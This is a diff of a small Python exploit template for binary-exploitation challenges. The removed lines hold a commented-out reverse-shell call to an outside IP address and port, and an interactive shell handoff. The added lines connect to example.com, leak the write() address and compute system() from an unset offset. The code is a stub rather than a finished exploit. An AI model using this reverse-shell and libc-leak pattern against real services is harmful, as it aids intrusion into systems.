@@ -1,38 +1,22 @@
 #!/usr/bin/python
 
-from Pwning import *
-# customs when binary doesn't have nx eable or mprotect/nmap is on got table
+from Pwn import *
+# when binary doesn't have nx eable or mprotect/nmap is on got table
 # from Shellcode import *
 
-# edit Templet with your own Name
-class Templet(Payload):
-	def __init__(self):
-		Payload.__init__(self)
-		self.host[1] = '' # my Target host
-		self.port = 0x00 # my Target port
-		self.mode = 0 # x86 target platform
-		# self.mode = 1 x86_64 target platform	
+exp = Pwn(host='example.com',port=8888)
 
-	# building my Payload
-	def buildPayload(self):
-		pass
-		
-	# other method goes here
-	def leakLibcSystemAddr(self):
-		pass
+def exploit():
+	# some exploit code
+	exp.p(0xcafebabe)
+	exp.write('A'*4)
 
-	# ok i go to pwn it :D
-	def pwnTarget(self):
-		# shell.backconnectShell('192.241.177.173',8081)
-		conn = Telnet(self.host[0],self.port)
-		# ..... snip .....
-		# when i exploit a bin with NX was enabled
-		# print '[+] leak_func() :',hex(leak_func_addr)
-		# print '[+] system() :',hex(system_addr)
-		# print "[+] '/bin/sh' :",hex(bin_sh_addr)
-		# ...... snip ......
-		print '[+] Pwned Shell.'
-		conn.interact() # pwn the shell
+	write_addr = exp.up(exp.recv(4))
+	system_addr = write_addr - offset
 
-templet = Templet()
-templet.pwnTarget()
+	print '[+] write() :',hex(write_addr)
+	print '[+] system() :',hex(system_addr)
+
+	exp.io()
+
+exploit()
